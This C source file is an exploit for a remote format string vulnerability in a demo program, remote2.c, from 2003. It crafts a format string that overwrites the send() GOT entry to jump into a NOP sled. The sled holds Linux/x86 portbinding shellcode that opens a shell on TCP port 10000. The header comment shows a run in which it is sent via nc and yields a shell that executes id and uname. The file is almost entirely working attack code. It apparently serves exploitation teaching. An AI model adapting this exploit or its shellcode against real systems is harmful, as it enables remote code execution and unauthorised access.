/*
 * $Id: remote2-ex2.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * remote2-ex2.c - remote2.c exploit (remote format strings)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple remote format string vulnerability exploit, short version of the
 * previous remote2-ex.c. Tested on Linux 2.4.x with gcc-2.95.4 (offset = 8).
 *
 * raptor@karma:~/devel$ (./remote2-ex2; cat) | nc localhost 1234
 * Using send() address    : 0x8049ba4
 * Using ret address       : 0xbffff102
 *
 * > 
 *
 * raptor@karma:~/devel$ nc localhost 10000
 * id
 * uid=3008(raptor) gid=1000(redazione) groups=1000(redazione)
 * uname -a
 * Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
 * exit
 * raptor@karma:~/devel$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	1024		// max size of the malicious buffer
#define RET	0xbffff102	// hardcoded value found during tests
#define SEND	0x08049ba4	// address of send() entry in .got
#define OFFSET	8		// offset to first address on stack
#define NOP	0x90		// use nops padding

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/x86 portbinding shellcode (88 bytes) */
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68"
"\x27\x10" // port 10000/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x04\xcd\x80"
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF], nop[BUF / 2];
	int offset = OFFSET;
	int n1, n2, ret1, ret2;
	char *p = buf;

	/* check command line for offset */
	if (argc > 1)
		offset = atoi(argv[1]);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, RET);

	/* initialize the NOP sled */
	memset(nop, NOP, sizeof(nop) - 1);
	nop[sizeof(nop) - 1] = 0x0;

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(SEND);
	p += 4;
	*((void **)p) = (void *)(SEND + 2);
	p += 4;

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - strlen(buf))		% 0x10000;
	n2 = (ret2 - strlen(buf) - n1)		% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%%d$hn%%.%du%%%d$hn%s%s", n1, offset, n2, offset + 1, nop, sc);

	/* print some output */
	fprintf(stderr, "Using send() address\t: %p\n", SEND);
	fprintf(stderr, "Using ret address\t: %p\n\n", RET);

	/* output the evil format string */
	fprintf(stdout, "%s\r\n", buf);
	fflush(stdout);
}
